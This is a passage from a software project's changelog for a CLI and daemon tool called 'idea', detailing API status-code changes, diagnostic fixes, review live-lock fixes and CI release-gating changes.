  (`docs/security.md` promises the check runs on the write path *and* again when
  the registry is built), and the entry it refuses could never have served a
  request. Daemon startup and project open are unaffected: `config.Load` does
  not call `ValidateProvider`, and `resolveProviderEntries` partitions and logs
  rather than failing.

  Consumer impact: any third-party client sending an extra key to either config
  endpoint now gets a 400, not only the two first-party ones. Both first-party
  clients' exact bodies are pinned as literals in a test, so a field added on one
  side fails there rather than in a broken Settings page.

  `Engine.RevisePlan` already refused a plan with change sets — but it runs
  inside the launched operation and returns `InitiativeFailed`, so a healthy
  `plan_approved` initiative with one unreviewed change set became **failed**
  because of a refusal the API answers synchronously on the sibling endpoint one
  function away. `ApprovePlanInitiative`'s guard carries the comment *"Matching
  RevisePlan and ReopenPhase"*; that was false of the Runtime sibling.

  The `api_key` case did **not** write an unusable entry, which is worth stating
  because the first version of this fix got it backwards and would have shipped a
  regression: `ResolveProvider("openai", {})` returns the complete preset, so the
  write really did configure OpenAI, `demo` correctly went false, and real billed
  calls followed. The defect is exactly that a field sent to carry a credential
  was discarded under a response saying the write succeeded. Configuring a preset
  by name alone still works, and a test pins it.

  Seven Runtime preconditions that used plain `fmt.Errorf` now carry the
  precondition type, so the 409 no longer depends on which status the handler
  happened to pass. And `make api-check`'s conflict axis learned to follow a
  helper whose *every* status is 409 — which found `PUT /providers` answering
  409 through `writeReloadErr` while declaring none, though its sibling
  `PUT /executors` reaches it identically and did declare one. The obvious rule
  ("follows anything that writes 409") is worse than the gap: `writeErr` carries
  a literal `StatusConflict` and 75 functions call it, so it would demand a
  spurious 409 on 78 of 81 routes.

- **`idea verify` can no longer complete a failed initiative, and it no longer
  discards a requirement you named.** Two defects in one command, both found by
  DX audit 7.

  A bare `idea verify` — no arguments, no flags — on an initiative that died at
  framing with a 401 printed `✓ verified status: complete`, exited 0, moved a
  terminal state to `complete` and discarded the recorded `failure_reason`. With
  zero requirements the gate loop never runs, so `allVerified` stays true
  vacuously, and the terminal write was an unconditional `SetInitiativeStatus`.
  `handleVerify` was the one state-writing path that never went through the
  Runtime, which is why `verifyInitiative` declared no 409 and the conflict axis
  correctly agreed there was nothing to declare.

  | | Was | Now |
  |---|---|---|
  | `POST …/verify` on a `failed` initiative | 200, status becomes `complete`, `failure_reason` erased | **409** `cannot verify a failed initiative` |
  | `POST …/verify` with zero (or only removed) requirements | 200, status becomes `complete` | 200, the gate reports not-done and the status is unchanged |
  | `POST …/verify` `{"requirement":"REQ-99"}` where REQ-99 does not exist | 200, reporting on a *different* requirement | **404** naming REQ-99. The gate and the returned coverage stay initiative-wide either way — the defect was the silent discard, not the breadth of the report |
  | `idea verify REQ-99` | exit 0, `REQ-1 0/1 verified` | exit non-zero, `no requirement matching "REQ-99"` |

  The last row is the CLI half: `cmdVerify` built a request body only for
  `<req> --pass|--fail|--waive` and fell through to `{}` otherwise, so the name
  never left the machine. The write path was already correct, so the validation
  existed and was applied to the opposite case from the one that was reported.

  The refusal is on the **recorded failure reason**, not on the status, and that
  distinction is load-bearing. Five entry points — apply, revert, revise, retry,
  reopen-phase — claim `running` *from* `failed` by design, and the claim
  deliberately leaves `failure_reason` intact so the release can restore it. For
  the length of any of them a failed initiative reads `running`, so a
  status-only guard passed and the completion write cleared the reason
  **permanently** — the release restores the status, not the reason. A commit
  review found it by reproducing exactly that against the real handler.

  `running` is otherwise deliberately **not** refused. `idea apply` does not
  wait for its operation, so the apply-then-verify sequence both demo guides
  document, and which `scripts/smoke.sh` runs, happens inside that window. A
  test pins that it stays allowed.

  **Recording human evidence is not refused on a failed initiative** — only the
  gate is. A pass, fail or waive is a judgment about a requirement, not about
  the workflow, and `idea retry` calls `SupersedeRequirements` before re-running
  framing, so evidence that could not be recorded now could never be recorded
  again. The first version of this fix gated both.

  The completion write is also guarded at the store (`CompleteInitiative`, which
  refuses to run over `failed`), so the window between the Runtime's check and
  the write is closed and a future caller that does not go through the Runtime
  cannot repeat this. That guard is expressed as `status != 'failed'` rather than
  a list of the five states that are allowed: `InitiativeStatus` has six values,
  and an enumeration would silently exclude a seventh added later.

  This is audit 5's **A2**, which was rejected on review and recorded in
  `deferred.md`. That rejection was correct — A2 proposed requiring a change set
  before `complete`, which would have killed the documented all-waived flow — and
  the predicate here is different: at least one requirement that is not
  `removed`. Waived requirements are a human's judgment that the work is out of
  scope, so all-waived still completes; zero requirements and all-removed do not.
  The all-removed case is not hypothetical: `Engine.Revise` supersedes every
  requirement before regenerating, so a model failure there leaves an initiative
  with N removed requirements and nothing active.

- **`idea approve-plan` accepts the plan instead of re-reviewing it.** It was a
  retry wearing an accept's name: `Engine.ApprovePlan` dispositioned the open
  findings and then re-ran the adversarial review, and a model reviewer is not a
  fixed point. DX audit 7 observed the plan review blocking **eleven consecutive
  times** on `openai/gpt-4o-mini`, across `revise-plan` regenerations and five
  further bare `approve-plan` calls, with no route to `plan_approved` from the
  CLI, the API or the web UI. `revise-plan` re-enters the same function;
  `PlanPage.tsx` posts to the same endpoint.

  The PRD half never had this: `Engine.Approve` accepts outright and does not
  re-run `runReviewLoop`. This closes that asymmetry.

  | | Was | Now |
  |---|---|---|
  | `POST …/approve-plan` on a blocked plan review | 202, then a fresh review that could block again | 202, then `plan_approved` — no model call |
  | `POST …/approve-plan` on an already-`plan_approved` initiative | 202, and every open finding dispositioned `accepted_risk` | **409** `this plan is already approved` |
  | `POST …/approve-plan` with an open `critical` deterministic finding | 202, then a re-block | **409** naming `idea revise-plan` |

  Consumer impact: a client calling `approve-plan` to *obtain a fresh review*
  no longer gets one — use `revise-plan`, which regenerates the plan and
  reviews it. The 202 and its `operation_id` are unchanged.

  Two gates ship with it. A **dependency cycle cannot be accepted**: an
  undisposed `critical` finding from the deterministic plan checks refuses the
  request, because `nextReadyTask` can never schedule a task whose predecessors
  can never apply, so accepting one would trade this live-lock for a Build no
  command can advance. Deliberately `critical` only — the traceability check
  emits `high` per untraced task, and a task is untraced whenever the model's
  `requirement` string does not resolve, which is ordinary; sweeping `high` in
  would refuse the common case and rebuild the live-lock with a new message.
  And **`plan_approved` is no longer an accepted starting state**, because
  `SetInitiativeStatus` clears `judgment_reason` and the web UI's commit bar
  rendered in every status — a stray click would have signed off every open
  finding as a human's `accepted_risk` with no review behind it. That commit bar
  and its "needs approval" pill are now gated on `needs_human_judgment`.

  Why six audits missed it: `demoProvider` primes a **finite** queue from
  `demo.block_plan_review_cycles`, so the demo reviewer always converges and
  `approve-plan` succeeding was indistinguishable from the queue running out —
  `scripts/smoke.sh` said exactly that in its own comment. A converging blocker
  proves the park is reachable; it can never prove the escape exists. There is
  now a smoke pass with a reviewer that does not converge, and it fails on the
  unfixed tree.

- **`idea doctor` asks the daemon whether it has the API key, and fails when it
  does not.** It asked itself, which is the wrong process: `keyProblems`
  resolves the variable with `os.Getenv`, so doctor reported the shell you typed
  in while the run is made by the daemon, which reads its environment once at
  start. Export a key after `idea init` and doctor printed `all checks passed`
  over a daemon that will 401 every call — the exact state six documents credit
  it with catching. The reverse setup warned about a key the daemon had.

  Now a failing check with a non-zero exit, naming the variable and whether the
  daemon or only your shell is missing it. A configured model with no key
  anywhere fails too: with `default_model` set that is not demo mode, it is a
  non-retryable 401, which `README.md` already said and doctor did not act on.

  `GET /providers` gained `key_set`, because `ready` folds a missing key together
  with a refused entry and the two have different fixes — telling someone to
  restart the daemon over an overridden `base_url` names a fix that changes
  nothing. `idea model set` had that exact defect and is fixed with it.

  With **no** daemon running the CLI keeps answering, because then this shell is
  the environment the next command starts one from — and that is precisely the
  state doctor's own remedy creates, so losing the answer there would have made
  `idea daemon stop` lead into a verdict-less pass.

  A script gating on `idea doctor` will stop where it previously passed. That is
  the point: it stops before the run fails instead of after.

- **Six endpoints answer `404` for an id that matches nothing, where they used
  to answer 400, 409 or `200 []`.**

  | Endpoint, unknown id | Was | Now |
  |---|---|---|
  | `POST /operations/{id}/cancel` | `409` *is not running* | **`404`** |
  | `GET …/decisions/{id}/discussion` | `200 []` | **`404`** |
  | `POST …/decisions/{id}/reopen` | `400` *is not decided* | **`404`** |
  | `POST …/decisions/{id}/resolve` | `400` *is not open* | **`404`** |
  | `POST …/questions/{id}/answer` | `400` *is not open* | **`404`** |
  | `POST …/initiatives/{id}/verify`, unknown `requirement` | `400` | **`404`** |

  A client that read 400/409 as "wrong state" must now also handle 404 for "no
  such id" — which is strictly more information, because those codes previously
  meant either. On `POST …/questions/{id}/answer` the two were indistinguishable
  for any given id: an already-answered question and one that does not exist both
  returned `400 store: question <id> is not open`, and a client does not know
  which of the two it is holding.

  The 400 text changed too, not just the status: these four state errors dropped
  the `store:` prefix they were leaking to clients.

  Four of the six said something actively false. `decision <id> is not decided`
  is a claim about a decision that does not exist, and `200 []` is the one shape
  a caller cannot distinguish from a real empty result.

  `POST …/initiatives/{id}/verify` also gained the initiative-existence check its
  siblings have: a bogus initiative with a plausible requirement name answered
  about a requirement of an initiative that does not exist.

  Fixed in the store rather than the handlers: a conditional `UPDATE` affecting
  zero rows has two causes and these call sites reported only one, so they now
  ask which. `writeErr` already upgraded a `*store.NotFoundError` to 404
  everywhere — that branch was simply never reached.

  `docs/api.md` and `docs/openapi.yaml` claimed cancel was "the only path where
  a missing operation reads as 409 rather than 404". It no longer is, and both
  said so in prose no guard reads.

- **`idea doctor` fails when the daemon is running a different build.** It is
  detached and outlives the binary that started it, so replacing that binary —
  `go install`, `make build`, a new release — leaves the *previous* version
  serving every command while `idea version` reports the new one. doctor printed
  `✓ daemon running` and `all checks passed` straight through that, in both
  directions, and no document anywhere said to restart it: the eleven existing
  mentions of `idea daemon stop` are all about a late-exported API key.

  A CI script gating on `idea doctor` will now stop after an upgrade until the
  daemon is restarted, which is the point of it. `idea daemon status` keeps exit
  0 — it answers whether the daemon is running, and it is — but names the build
  and the mismatch. `idea version` gains a second line only when they differ.

  Compared by commit, not version: a stale daemon usually answers `dev` and so
  does the new CLI, so comparing version strings would have missed the case
  entirely. Commits normalise to seven characters, because `make build` stamps
  `git rev-parse --short` while the toolchain records all forty.

- **`GET /initiatives/{id}/next` says *why* an initiative is waiting on you, and
  the CLI can now act on it.** The `resolve` token gains a reason —
  `resolve prd`, `resolve plan-dependencies`, `resolve plan`,
  `resolve verification` — and four commands land alongside it: `idea approve`,
  `idea revise`, `idea approve-plan`, `idea revise-plan`. A client switching on
  the old bare `resolve` needs a prefix match; an initiative parked before this
  release still reports bare `resolve`.

  The README's own quick start, on the model the README names, failed 4/4 runs
  before this. The adversarial PRD review does not converge with a real model,
  the initiative parks in `needs_human_judgment`, and **no CLI command could
  move it**: `idea next` pointed at `idea decisions`, which prints "No decisions
  yet."; the findings were under `idea reviews`, which nothing named;
  `idea advance` refused; and dispositioning every finding through the API
  changed nothing, because the gate is the status, not the findings. The escape
  was `POST …/approve`, which had no caller anywhere — not the CLI, not the web
  UI (whose Define page calls `/revise`), not a test. Reaching it meant curl and
  the per-install token.

  The reason is now recorded (migration 18) rather than inferred. The web UI
  inferred it from the presence of the execution-plan artifact, which is
  accurate enough to light a phase pill and not accurate enough to name a
  command: `runExecutionPlan` writes that artifact *before* the dependency check
  that produces two of the six causes, so the inference says "approve the plan"
  for a plan already known to be incomplete — which would set `plan_approved`
  over a broken graph and leave a blocking finding that wedges completion later.

- **`POST /approve` and `POST /resume` refuse states they used to overwrite,
  answering 409.** `Engine.Approve` was an unconditional status write with no
  check of any kind: it released the claim a running `advance` held, after which
  a second advance was accepted and two ran concurrently on one initiative. It
  is a compare-and-swap now — a read-then-write would only have narrowed that
  window, which is what `ClaimInitiativeRunning` already exists to say. `resume`
  took no claim either and re-ran the review loop from any state, silently
  discarding an approved plan. Both are declared in the spec.

  Neither endpoint had a caller anywhere — no CLI, no web UI, no test — so
  nothing observable breaks.

- **`GET /initiatives/{id}/next` distinguishes a failed initiative from a running
  one, and `idea next` exits non-zero over one.** The token set gains `failed`,
  and the 200 body carries an optional `failure_reason` alongside it. A client
  with an exhaustive switch over the old eight tokens needs a `failed` arm; a
  script that treated `idea next`'s exit code as "did the loop advance" now sees
  a failure it previously could not.

  It was worth breaking. `next` collapsed `running` and `failed` to `wait`, so a
  failed initiative was told the workflow was still running — `idea next` printed
  `workflow running — try \`idea watch\`` and exited **0**, forever. `idea execute`
  correctly points at `idea next`; `idea next` pointed at `idea watch`; `idea
  watch` needs a TTY and exits 1 without one. The recovery loop was closed and
  every command in it reported success. Reachable from an ordinary provider 401
  and from `idea cancel`.

  Found by DX audit 5, planned as Track A / A3, **never implemented and never
  recorded in `deferred.md`** — then found again by audit 6, which is the third
  time this repo has shipped a round with a planned fix that had no owner.

- **`idea new` names the provider error instead of pointing at the log.** Any
  command that waits on an operation — `idea new` and `idea next --until-human` —
  now renders the initiative's `failure_reason` when that operation fails, rather
  than `run_initiative failed — run \`idea logs\` for details`. The daemon was
  already holding the full 401; the CLI sent you to fetch it. Not breaking: the
  exit code was already 1.

- **`reconcileStaleOperations` records why it failed an initiative.** It used
  `SetInitiativeStatus`, the one transition that deliberately leaves
  `failure_reason` alone (`store/repo.go:195`), so an initiative failed by a
  daemon restart mid-operation was `failed` with an empty reason and `idea
  status` reported a failure it could not explain. `releaseOrphanedClaims`
  fifty lines below already used `FailInitiative`. Not breaking on the wire; the
  field goes from empty to populated.

- **Four refusals that used to be silent successes.** All four shipped in the
  commits above and are listed here because they are the classes 0.2.0 labelled
  BREAKING, and a client cannot discover them from the code:

  | Change | Before | After |
  |---|---|---|
  | `GET …/why`, `…/impact`, `…/trace` with an unknown `type` | `200` and an empty result | **`400`** naming the valid types |
  | `POST …/suggest-answers` on an initiative that does not exist | `202` and an operation id for work that cannot succeed | **`404`**; **`409`** while one is running |
  | `idea doctor` when the daemon rejects the CLI's token | `✓ all checks passed`, exit `0` | a failing check naming the recovery, exit **non-zero** |
  | `idea daemon stop` with no pidfile but a live daemon | one message, and the daemon left running | names `pkill -f 'idea daemon'` and exits non-zero |

  A script treating `idea doctor`'s exit code as "is this install healthy" now
  sees a failure it previously could not, which is the point of it.

### Added

- **`make version-check` now proves released changelog sections have not
  changed.** A released section is immutable — goreleaser ships `CHANGELOG.md`
  in every archive — so editing one rewrites what shipped, and moving entries
  out of one re-advertises old work as new. `e53bf2f` did exactly that with 29
  lines of v0.1.0 history, and nothing saw it: no line was deleted, so a
  lost-line or line-count check would have passed.

  The baseline is the **newest** tag, not each section's own tag. That
  distinction is load-bearing: `[0.1.0]` was legitimately corrected between
  v0.1.0 and v0.2.0, so comparing each section to its own tag fails forever and
  would force re-introducing a false claim to satisfy a checker. It rides
  `version-check` rather than adding a tenth target, and `compile-no-node` now
  checks out with `fetch-depth: 0` — without tags the rule skips, and it says so
  rather than printing a green line. It also fails closed if the tag-side file
  parses to no sections at all, rather than reporting success having compared
  nothing.

  **The cost, stated rather than discovered later:** a deliberate correction to
  released history is red on every push until the next release moves the
  baseline. That is the same trade the `[0.1.0]` operation-count fix would have
  faced. `RELEASING.md` says what to do about it.

- **`idea review <CHG-n> approve --accept-findings`** — a human may accept a
  change set the adversarial reviewer will not pass, the way `idea approve`
  already accepts a PRD and `idea approve-plan` a plan.

  This was the **third** live-lock of one shape, and the one that kept the keyed
  quickstart at 0/3 after the other two were fixed. `idea next` names
  `idea review CHG-1 approve`; that runs a fresh adversarial review, and a model
  reviewer is not a fixed point. Worse, the first attempt **persists** its
  findings, so every later attempt is refused by the `review_open_blocking` deny
  before the review runs, and `idea apply` answers "needs approval first". Every
  other command refuses. Measured on `openai/gpt-5.6-luna` and `gpt-4o-mini`
  alike.

  The accept dispositions the reviewer's open findings on that change set as
  `accepted_risk` against the human, **re-runs** the deny gate, and does not run
  a fresh review. Two predicates decide what it may sign off, and both are
  needed: a finding must carry **no deny code** (`secret_sweep`, `pii`,
  `host_exec`, `blob_digest_mismatch` — only the reviewer leaves it empty) **and**
  be undisposed (a failing build check carries no code but is `rejected`, and a
  failing build is not a judgment to accept away). Anything it declines to touch
  still denies, naming the code.

  The web UI gets the same affordance, and now renders the error when a verdict
  is refused rather than swallowing it.

- **`demo.block_change_set_review_cycles`**, and the change-set review has its
  own fake-provider key. All three adversarial reviews shared the key `review`,
  so the change-set review could not be made to block on demand — which is why
  five smoke passes and seven audits never reached the state above. There is a
  sixth smoke pass now, with a reviewer that blocks 50 times.

- **A tag now gates on everything CI runs, and the spec's version is checked by
  a machine.** Audit 7 recorded these as the two longest-lived open findings in
  the project, the two cheapest to fix, and one shared fix.

  `.github/workflows/release.yml` gated a tag on `go vet` and `go test` on
  `ubuntu-latest`: **none** of the eight guards, no `scripts/smoke.sh`, no macOS
  job, no web build or unit tests, and no `needs:` on anything. A red
  `enum-check` or `check-embed` shipped.

  The audit's own suggested fix — *"two lines: `needs: [compile-no-node,
  backend, macos, web]`"* — does not work: `needs:` resolves job ids **within one
  workflow file** and cannot reference a job in another. So the release job moves
  into `ci.yml`, whose unfiltered `on: push:` already ran every guard on a tag
  push; they simply did not gate. Copying the guard steps into a separate
  workflow was the alternative and was rejected — a ninth guard added later
  would not reach the copy, and that divergence *is* the finding.

  `internal/ciguard` asserts a **completeness** rule: every job in `ci.yml`
  either gates the release, is the release, or is on an explicit exemption list
  carrying a reason. A test pinning today's four job names would let the next
  job diverge exactly as this one did.

  `docs/openapi.yaml`'s `info.version` had said `0.1.0` since the file was
  created — unchanged across v0.1.0, v0.2.0 and v0.3.0, while the spec gained
  four response codes, a schema, two properties and an enum in this round alone.
  `make version-check` reads it on two axes: **every push**, it must not be older
  than the newest released `CHANGELOG.md` heading (this never predicts the next
  version, and would have fired the first push after v0.2.0); **at tag time**, it
  must equal the tag, run before goreleaser so a mismatch costs a deleted tag
  rather than a published release. `info.version` is now `0.4.0`.

  `RELEASING.md` is new. There was no release checklist anywhere — `CONTRIBUTING.md`
  contained no occurrence of "release" — and the one instruction that existed
  (*"Bump `info.version` when you tag"*) lived in a hosting document nobody opens
  at tag time. `CONTRIBUTING.md` also now names the nine targets CI gates on
  beyond its four; following it exactly produced a red PR.

### Changed

- **`docs/security-model.md`'s `review_open_blocking` row is conditionally
  overridable.** It sat beside five codes that genuinely are not, and read as
  flatly non-overridable. Only this one is a reviewer's judgment.

- **Documented model ids now resolve.** `anthropic/claude-3-7-sonnet-latest`
  (9 sites) and `openrouter/anthropic/claude-3.7-sonnet` are absent from the live
  catalogs; the examples move to `anthropic/claude-sonnet-4-5-20250929`,
  `openai/gpt-5.6-luna` and `openrouter/anthropic/claude-opus-5`. The first two
  were re-checked against the providers' own `/v1/models` on 2026-09-10 and are
  live; the undated `anthropic/claude-sonnet-4-5` this entry first named is
  absent from that listing, which is why the examples now carry the date. A ledger predicate pinned to a model id has
  a shelf life, so the date is part of the claim — audit 4's own D9 row had to be
  updated for exactly that reason.

- **An initiative reference that matches nothing is now an error, and two
  commands stopped ignoring theirs.** `docs/cli.md` promised that every
  initiative-scoped command takes an optional reference defaulting to the most
  recently created, and used `idea status` as its worked example.

  | | Was | Now |
  |---|---|---|
  | `idea <cmd> <unknown-id>` on the 16 reference-taking commands | `resolveInitiative` returned the argument unchecked; whatever downstream 404 that endpoint gave | exit non-zero, `no initiative matching "…"` |
  | `idea status <id>` / `idea status ZZZZ` | printed **every** initiative, exit 0 | scoped to that initiative; an unknown id is an error |
  | `idea changed` | acted on `inis[0]` — the **oldest** initiative | acts on the newest, as documented |
  | `idea changed <id>` | ignored the argument | scoped to that initiative |

  `idea status --json` stays an **array**, filtered to one element when scoped:
  `docs/cli.md` documents that shape, ledger row `G4` pins the sentence, and
  `jq '.[0]'` keeps working.

  `idea explain` was folded into `resolveInitiative` rather than left behind —
  it re-implemented the resolution by hand, so a fix applied to the shared
  helper would have skipped one of the commands the docs name.

  `idea prd` is deliberately unaffected: its first positional is an artifact
  **kind**, not a reference.

### Fixed

- **`idea retry` waits, and reports what the retry reached.** It posted and
  returned, so retrying against an unchanged cause — the same 401, the same
  unreachable `base_url` — printed `✓ retry started` and exited 0 while the
  operation failed half a second later. The tick said the opposite of what
  happened, on the command whose whole job is recovering from a failure.
  `--no-wait` keeps the old behaviour.

- **`idea reopen-phase` exists.** `idea revise` has prescribed it since audit 7,
  in the two states where revising the PRD would discard work below it, and the
  verb was never added: the route was registered and `docs/api.md` documented
  it, so following the advice answered `unknown command "reopen-phase"`. A
  misspelled phase is now refused locally, naming the three the daemon accepts,
  instead of being sent on to become a `400 invalid body`.

- **`idea doctor` no longer renders an unreadable store as an empty one.**
  `resolveInitiative` returned a transport failure and "no initiatives yet"
  through the same error, so doctor printed `graph audit: no initiative yet —
  nothing to audit` over a store every other command exited 1 on, and reported
  "all checks passed".

- **`idea doctor` no longer reports "not running" for a daemon that is
  running.** Its probe builds a client first, which fails when the token file is
  gone — so after a state-directory wipe doctor said the daemon was down while
  `curl` got a 200 from it and `idea daemon status` said running. Three answers
  to one question, and the designated diagnostic had the wrong one. `/health` is
  unauthenticated, so it is now asked directly.

- **A long model call reports elapsed time.** The provider client allows five
  minutes per attempt and the engine retries three times, so an endpoint that
  accepts and never answers produced ~15 minutes in which `working…` was the
  only output — no counter, no timeout, nothing to separate a slow call from a
  dead one, while `idea status` said `running` and `idea watch` needs a TTY.

- **`idea reviews` recommends a `harness.yaml` key that exists.** It said `set
  tests_cmd in harness.yaml`, built by concatenating the finding category with
  `_cmd`; the field is `test_cmd`, so following it literally made `idea config
  validate` exit 1 with `additional properties 'tests_cmd' not allowed`. The
  category is pinned by the `/checks` filter and could not simply be renamed,
  so the config key is now passed separately, and a test ties every such
  recommendation to the schema that validates the file.

- **Six precondition refusals say what to run instead, and whose status they
  are reporting.** `no plan to approve (status=approved)` was reporting the
  *PRD's* status and read as though the plan were approved.

- **A malformed `harness.yaml` answers 422, not 404, and never with an absolute
  path.** `config.Load` runs while resolving the project, so its failure reached
  every project-scoped route as a store miss — neither the kind nor the
  reference `NotFound` promises — carrying the absolute path of the file, which
  `InternalError` promises never reaches a client. 500 would be the wrong
  repair: the request cannot succeed until the user edits the file.

  Both malformations, not just the syntactic one: YAML that does not parse, and
  YAML that parses and the schema rejects. The second is the likelier — a first
  version of this fix covered only syntax errors, so `tests_cmd`, literally the
  key this release's own `idea reviews` fix stopped recommending, still 404'd
  with raw jsonschema text. Reachable on a cold daemon; a running one caches its
  config, which is why every "export your key" instruction ends in `idea daemon
  stop`.

- **`idea retry` and `idea reopen-phase` do not exit 0 with the outcome
  unknown.** Both waited and then, if reading the next step failed, printed
  `watch progress:` and returned success — the same "reported a start as a
  result" they were changed to stop doing, one layer up.

- **`docs/openapi.yaml`'s `updateExecutors` 200 is valid JSON Schema again.**
  `required: [status]` was indented one level too far, landing inside
  `properties:` — so it declared a property *named* `required` whose value was a
  list, and the actual constraint was gone. `make api-check` now walks every
  `properties` node.

- **The spec declares the statuses its handlers emit.** Ten of thirty-six
  non-GET operations did not declare 500, though `writeErr` promotes any storage
  failure to it, and `createInitiative` did not declare 404. `createProject` has
  no path parameter and genuinely cannot 404, which is the one stated exemption.

- **Every operation declares a `default` response.** `403` (host/origin guard)
  and `405` (wrong method, with an `Allow` header) are emitted on all 81
  operations and were declared on none — a deliberate choice the spec argues
  for, but one that leaves an undeclared status as an unhandled branch in most
  generated clients. `default` gives them somewhere to go without repeating two
  responses 81 times. The per-operation `404`, `422` and `500` stay literal: a
  generator cannot turn a catch-all into "this operation answers 404 for a bad
  id", and the guard requires the literal keys for that reason.

- **The spec's own operation count is right.** It said 84 as the justification
  for not declaring 404 and 405 per operation; there are 81. An argument about a
  set that miscounts its subject is the weakest kind, and prose is exactly what
  rots — so the number is now checked.

- **The graph endpoints say that human codes do not resolve.** `impact-counts`'
  worked example was `requirement:req-1`, a form that returns `0` rather than an
  error — indistinguishable from a node with no edges. `ChangeSetId` promises
  both forms resolve; `GraphNodeId` said only "Graph node id."

- **Both config `PUT`s say they are not round-trippable from their `GET`.**
  `GET /providers` carries `demo`, `models` and `git_commit` beside the writable
  fields, so echoing it back answers `400 json: unknown field "demo"`; and
  `GET /executors` is a catalog of all four executor kinds rather than a
  projection of the config, so there is no round trip to perform at all.

- **`--accept-findings` is documented where the magic path is.** It reached the
  code and both demo guides and neither `README.md` nor `docs/quickstart.md` —
  the two documents most readers actually follow — so a reader on the keyed path
  who hit a blocking finding had no documented way past it.

- **`internal/daemon/runtime.go` no longer asserts that a blocking change-set
  finding cannot be cleared.** It can, and has been able to since audit 7. The
  ledger row pinning that sentence was green over it, because its predicate
  contained a two-character `\n` that could never match; `ledger-check` now
  rejects an escape sequence in a predicate, since an unmatchable `present:` is
  indistinguishable from a fixed defect.

- **`docs/demo-greenfield.md` shows each command beside its output again.** The
  `--accept-findings` note had been inserted between the two.

- **`README.md` and `docs/quickstart.md` describe the keyed path as it actually
  runs.** Both presented the magic-path block as a straight line. Measured on
  `openai/gpt-5.6-luna`, 2 of 2 runs, it is not: the PRD review does not
  converge and the plan review raises blocking findings, so it stops for a human
  twice before reaching `idea review`; `idea review CHG-1 approve` can refuse on
  an open critical finding; and the requirement is not `REQ-1`, because every
  review cycle supersedes the requirement set and mints new codes — one run
  created 34 rows, superseded 22, and ended with `REQ-23`–`REQ-34`.

  Nothing in the product was wrong here: `idea new` and `idea next` name the
  command that moves it on, and verifying a superseded code answers
  `requirement "REQ-1" in state "removed" cannot take a human judgment`. The
  documents were written against the demo provider, where the review converges
  on the first cycle and `REQ-1` therefore survives, and they did not say so.

- **`idea approve`'s advice line no longer overstates what it does.** `idea next`
  offered it as "accept the PRD as it stands and move to design", while
  `cmdApprove` posts, prints `✓ PRD approved` and tells you to run `idea next
  --until-human` — the command's own output contradicting the advice one step
  earlier.

- **CI runs `make build`, the way CONTRIBUTING documents it.** It ran a bare
  `go build ./...`, which compiles every package but skips what the target
  actually does — embed the web UI, stamp the version through ldflags, write
  `bin/idea`, restore the placeholder. A contributor following CONTRIBUTING
  could be green locally on a target CI never ran. A test now asserts every
  documented `make` target appears in a CI `run:` step, with `test` and `vet`
  exempt because CI runs their bodies verbatim.

- **`scripts/smoke.sh` no longer fails at random.** Its assertions piped a
  command into `grep -q` under `set -o pipefail`, which fails *even when the
  grep matches*: `grep -q` exits on the first match and closes the pipe, the Go
  binary is usually still writing, the next write gets EPIPE, and Go re-raises
  SIGPIPE on stdout — so the process dies with 141 and `pipefail` adopts that as
  the pipeline's status. The `||` branch then printed a message saying the
  output was wrong when it was not.

  Measured against the real binary on a preserved failing state: 7 failures in
  150 runs of `idea reviews | grep -q 'Review findings'`, with all three
  findings present and printed correctly whenever the command ran on its own —
  and 0 in 150 for the capture-then-grep shape now used. That 4.7% matches the
  rate observed across 33 full runs. This is a test-harness defect, not a
  product one, but it made every other guard's green worth less.

- **The very first `idea init` reports the cause too.** The daemon's stderr is
  redirected into `daemon.log`, but only if the file opens — and on a first run
  the state root does not exist yet, so that failed silently and a start failure
  produced the generic message pointing at `idea logs`, over an empty log. That
  is the one moment the message most needs to be specific. Measured: 0.1 s with
  no cause before, 1.3 s with the full bind error after.

- **`idea init` reports a failed daemon start instead of hanging.** With a
  non-daemon process holding the port, it printed *nothing at all* for a
  code-bound ~51 minutes: the health probe used the 60-second data-call timeout,
  `ensureDaemon` calls it 51 times, and the loop could not tell "not ready yet"
  from "already dead". The reason was in `daemon.log` the whole time and the
  message only named the command that would show it, while `idea doctor`,
  `idea status` and `idea daemon status` stalled on the same probe — the last
  answering `daemon is not running` after a full minute.

  The probe now has its own 2-second timeout, the spawned daemon is waited on so
  an immediate exit ends the loop at once, and the failure quotes the log:
  `the daemon exited immediately: idea: listen tcp 127.0.0.1:8787: bind: address
  already in use; run \`idea logs\` for the full output`.

  Observed **4 seconds** when the daemon exits, which is the held-port case. Be
  precise about the other one: if the spawned daemon *hangs* instead of exiting,
  the child-watch never fires and the bound is the loop — 50 × (2s + 100ms), or
  **~107 seconds**. That is 1.8 minutes rather than 51, not 4 seconds.

  Only the log this run produced is quoted. `daemon.log` is opened `O_APPEND`
  and never rotated, so the last line of the file is whatever failed last —
  possibly weeks ago, possibly a routine startup line from a run that worked.
  The offset is recorded before the child starts, and the `idea logs` hint
  survives, because quoting one line must not remove the route to the rest.

- **An ambiguous `CHG-n` now names the candidates.** `idea next` prescribes
  `idea apply CHG-1`; with two initiatives in one project each holding a CHG-1,
  that command always failed with *"use the full change set id"* — and no
  human-readable command printed one. `idea changes` resolves a single
  initiative and prints the human id only, while apply/review/change resolve
  project-wide, so the lister and the resolver disagreed about scope. The id
  existed solely in `idea changes --json`, which nothing named, and `next` went
  on exiting 0 and prescribing the same failing command.

  The refusal now lists each candidate's full id with its initiative title, so
  the message itself carries a command that works. Resolving the ambiguity by
  preferring the newest initiative was rejected: silently applying a change set
  from the wrong initiative is worse than refusing.

  `idea next` no longer sends anyone there in the first place: it prints the
  full id when, and only when, the human one is ambiguous, so its prescription
  always runs. The readable `CHG-1` is still what you see in the ordinary case,
  which is almost always.

- **A rejected oversized context doc no longer strands an initiative.**
  `POST …/initiatives` with a doc over the size cap answered 413 having already
  committed the initiative as `running`, with no operation row — and nothing
  could reach it. `reconcileStaleOperations` sweeps operations, `retry` and
  `resume` both refused, `next` answered `wait` forever, the project's attention
  list stayed wedged, and there is no DELETE route: recovery meant hand-editing
  SQLite. The size check now runs with the other two in the pre-validation loop,
  making true a comment that had promised exactly this since it was written.

  Anything that still fails after the row exists — a blob write, or creating the
  operation — now marks the initiative `failed` with the reason rather than
  leaving it `running`, because `idea retry` requires precisely that status.

- **The phase rail derives Define from the judgment reason, not from an
  artifact.** `phases.ts` used execution-plan artifact presence to tell an
  M1-review park from an M2-plan park, since both share
  `needs_human_judgment`. The artifact is a proxy — `runExecutionPlan` writes it
  before the dependency check — so a park on `prd_review`, or one carrying no
  reason at all, read as past Define merely because an artifact from an earlier
  cycle was lying around. `running` and `failed` record no reason and keep the
